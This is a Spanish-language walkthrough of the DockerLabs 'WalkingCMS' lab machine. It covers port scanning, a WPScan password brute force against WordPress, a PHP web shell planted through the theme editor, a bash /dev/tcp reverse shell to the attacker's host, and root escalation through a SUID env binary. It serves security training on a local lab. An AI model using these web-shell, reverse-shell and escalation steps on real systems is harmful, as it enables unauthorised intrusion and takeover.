---
Nombre de la máquina: WalkingCMS
Sistema Operativo: Linux
Dificultad: Easy 🟢
Skills: WordPress Users Enumeration, Password Brute Force, RCE, Abusing SUID
Enlace de descarga: https://mega.nz/file/hSF1GYpA#s7jKfPy1ZXVXpxFhyezWyo1zCUmDrp7eYjvzuNNL398
---
---

## Montando el laboratorio

Lo primero que deberemos hacer para practicar con esta máquina es, dirigirnos a la página de [dockerlabs](https://dockerlabs.es/) y descargarnos la máquina desde el [siguiente enlace](https://mega.nz/file/hSF1GYpA#s7jKfPy1ZXVXpxFhyezWyo1zCUmDrp7eYjvzuNNL398). Una vez descargada y descomprimida ejecutaremos el siguiente comando.

```
sudo bash auto_deploy.sh walkingcms.tar
```

Al ejecutar el comando, nos pedirá la contraseña. Al introducirla correctamente, tendremos que esperar hasta que nos indique que la máquina está desplegada.

![Desplegando máquina WalkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/533c5f76-ecd0-46e1-9a87-9f8db19e3056)

Como podemos ver en la imagen anterior, la máquina está desplegada correctamente y su dirección IP es la **172.17.0.2**. Esto nos habrá montado la máquina vulnerable *WalkingCMS* a través de *docker*. 

## Como eliminar la máquina vulnerable

En caso de querer eliminarla, simplemente presionaremos en el teclado **CTRL** + **C** y la máquina se eliminará automáticamente.

![Eliminando la máquina WalkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/dc3f0a36-b414-4d58-a0d9-c815f78b0582)

## Comprobando la conectividad

Una vez desplegada, deberemos cerciorarnos de que tenemos conectividad con esta. Para ello, haremos uso del comando `ping` para realizar el chequeo.

![ping máquina WalkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/f235c400-f917-4f5d-b38b-183bfdbab0be)

Comprobamos que tenemos conectividad y, podemos intuir mediante el **TTL** que, el sistema operativo de la máquina víctima es *Linux*.

## Enumeración

En primer lugar, empezaremos con la enumeración de la máquina. Para ello, haremos uso del comando `nmap` con el fin de enumerar los puertos abiertos que tiene dicha máquina.

```
sudo nmap -p- --open --min-rate 5000 -n -Pn -vvvv 172.17.0.2
```

Ejecutamos el comando.

![primer nmap máquina walkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/95c261bf-448e-4778-9b57-f1e4c4e65642)

El único puerto que parece abierto es el *80*. Ahora, vamos a ejecutar una serie de scripts de enumeración de la propia herramienta de `nmap` y detectaremos la versión y servicio que corren en este puerto.

```
sudo nmap -sCV -p80 172.17.0.2
```

Ejecutamos el comando y el resultado es el siguiente.

![segundo nmap máquina walkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/f0af7611-70d8-4792-b67a-b7bb06a80df7)

Observamos que el servicio que está corriendo en el puerto *80* es *Apache2* y a primera vista, vemos que es la página por defecto. Vamos a enumerar algunos posibles subdirectorios de la máquina con el siguiente comando.

```
sudo nmap --script=http-enum 172.17.0.2
```

El resultado del comando anterior es el de a continuación.

![tercer nmap máquina walkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/b6e8ac6d-f28f-4753-ac52-085ec63bdcb3)

Encontramos dos subdirectorios interesantes. Nos enfrentamos ante un WordPress, por lo que vamos a echarle un vistazo a la web.

![página principal wordpress máquina walkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/5899f06b-25bf-4ba9-9619-5d5968d4ed5b)

Utilizaremos [WPScan](https://github.com/wpscanteam/wpscan), una herramienta de GitHub que nos permitirá enumerar en detalle la página en cuestión. A demás, buscaremos posibles usuarios válidos y realizaremos un ataque de fuerza bruta a estos. Para que sea más eficaz y realice todas las tareas que queremos, utilizaremos el API Token de esta herramienta.

```
wpscan --url http://172.17.0.2/wordpress/ --api-token TOKEN --passwords /usr/share/wordlists/rockyou.txt
```

Sustituiremos "TOKEN" por nuestro token correspondiente que se nos ha generado después de inciar sesión en la página de *wpscan*. Después de realizarse el ataque de fuerza bruta, nos ha encontrado las siguientes credenciales.

![WordPress Brute Force](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/411fbfdf-029b-4f33-93e4-b82ed2d3f555)

Al tener credenciales válidas, iniciaremos sesión en WordPress desde `/wp-login.php`.

![inicio de sesión máquina WalkingCMS](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/ec4171d7-bc73-4c4d-90a1-d895e25d65fa)

Efectivamente, las credenciales eran válidas y conseguimos iniciar sesión. 

![acceso al wordpress](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/59817688-2592-4210-91b7-b00b67e3fb26)

## Acceso al sistema (RCE)

A partir de aqui ya es fácil acceder al sistema. Nos iremos a *Apariencia* + *Theme Code Editor*.

![Theme code editor walkingcms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/c7665da0-ce98-4f00-8359-99f128032c81)

Una vez dentro, editaremos el fichero `index.php` del tema *Twenty Twenty Two*, ya que es el tema actualmente en uso.

![editando index-php walkingcms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/a20f4223-d1d1-45d7-bee2-8f3503fb4c0b)

Seguidamente, introduciremos el siguiente código **PHP** que creará un parámetro, con nombre *cmd*, el cual nos permitirá ejecutar comandos de forma remota, logrando así un **RCE**.

```
<?php
	system($_GET['cmd']);
?>
```

Debería de quedar de la siguiente forma.

![código php malicioso walking cms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/b11c57f6-44c7-4424-988c-39f4f53ea8dd)

Una vez editado, lo actualizaremos desde la parte inferior.

![update file walking cms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/049182af-6e1d-484a-a79e-ba1bdc8d3bfd)

Lo último que nos queda es dirigirnos a la siguiente URL, donde se encuentra nuestro fichero que hemos editado, y le añadiremos algún comando para ver si el **RCE** se ha realizado con éxito.

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=whoami
```

Podemos ver, que el comando se ha ejecutado correctamente y nos ha devuelto el resultando.

![rce ejecutado con éxito walking cms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/5bf34ab1-1656-413f-926d-78bc8bffcdb5)

En este punto, hemos conseguido una *ejecución remota de comandos* por lo que nos enviaremos una *reverse shell* a nuestro equipo de atacantes, de la siguiente manera.

Lo primero que haremos es, ponernos en escucha por el puerto desde el que vayamos a enviarnos la *reverse shell*, en mi caso, será el puerto *443*.

![nc en escucha puerto 443 walking cms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/787d7ca0-ea0e-43d2-b259-c322afb8770a)

Seguidamente, ejecutaremos la *reverse shell* desde la siguiente URL.

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

Al dirigirnos a la URL anterior, lograremos acceso al sistema.

![acceso al sistema walking cms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/26ffc9ab-0333-4d22-959e-6594a2463428)

## Escalada de privilegios (acceso como root)

Lo que **SIEMPRE** se hace al entrar al sistema desde un WordPress, es mirar en el fichero `wp-config.php` que se encuentra en la raíz del directorio donde se aloja el **CMS**. Este fichero almacena credenciales de la BD.

![credenciales bd walking cms config-php](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/99ec44a3-f695-4d3d-945e-e7289f68e7a3)

Sin embargo, en este caso, después de enumerar la BD, no lograremos mucha información relevante que nos permita escalar privilegios. Al no encontrar nada, buscaremos por binarios *SUID* del sistema.

```
find / \-perm -4000 2>/dev/null
```

AL ejecutar el comando anterior, obtenemos el siguiente resultado.

![binarios suid walking cms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/9d8a64f7-6c46-401b-9843-5d0616bb1fd3)

Nos percatamos que, el binario `/usr/bin/env` se encuentra en la lista. Este binario, nos permitirá escalar privilegios como el usuario propietario del mismo, el cual es *root*. Para ello, tendremos que ejecutar el comando de a continuación.

```
env /bin/sh -p
```

Al ejecutar el comando, conseguiremos acceso como *root* a la máquina víctima.

![lpe root suid env walking cms](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/42f3d933-2a27-488d-93bd-21d2312bdc99)

En este punto, hemos conseguido comprometer la seguridad del sistema, logrando acceso total al mismo.
